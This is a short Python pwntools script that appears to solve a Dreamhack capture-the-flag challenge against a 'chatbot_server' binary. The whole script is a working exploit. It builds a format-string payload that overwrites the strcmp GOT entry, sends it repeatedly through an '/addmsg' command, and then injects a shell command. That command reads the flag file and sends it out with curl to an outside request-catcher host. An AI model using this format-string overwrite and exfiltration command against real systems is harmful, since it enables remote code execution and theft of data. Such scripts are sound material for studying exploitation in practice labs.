from pwn import *
import time

context.binary = elf = ELF('./chatbot_server') # not patched, 

HOST, PORT = 'host3.dreamhack.games 14786'.split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = remote('localhost', 80)

strcmp = elf.got["strcmp"]

print("strcmp@GOT", hex(strcmp))

pay = b'%160$ln'
pay += f'%{0x40}c%12$hhn'.encode()
pay += f'%{0x1080-0x40}c%160$hn'.encode()
pay += b'a'
pay += p64(strcmp)

for i in range(10):
    p.send(b'/addmsg %s' % (pay))
    p.recvuntil(b'me :)')

pay = p64(strcmp+2)

for i in range(10):
    p.send(b'/addmsg %s' % (pay))
    p.recvuntil(b'me :)')

p.send(b'a')
time.sleep(0.6)
p.send(b'curl https://vzvzzfx.request.dreamhack.games?bankai=$(cat flag);')

p.interactive()